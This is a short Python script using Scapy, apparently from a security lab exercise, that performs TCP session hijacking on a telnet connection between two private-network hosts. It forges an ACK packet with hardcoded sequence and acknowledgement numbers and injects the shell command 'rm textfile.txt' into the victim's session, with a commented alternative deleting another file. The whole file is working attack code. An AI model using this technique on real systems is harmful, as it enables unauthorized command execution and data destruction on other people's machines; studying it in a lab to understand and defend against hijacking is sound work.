#!usr/bin/python3
from scapy.all import *
import sys

source_port = 32964
sequence = 2911876002
acknowldgement = 3703126433

print("Sending Session Hijacking Packet ...")
IPLayer = IP(src="10.0.2.10", dst="10.0.2.8")
TCPLayer = TCP(sport=source_port,dport=23,flags="A", seq=sequence,
	ack=acknowldgement)
# Data ="\rrm myfile.txt\r"
Data = "\rrm textfile.txt\r"
pkt = IPLayer/TCPLayer/Data
pkt.show()
send(pkt,verbose=0)
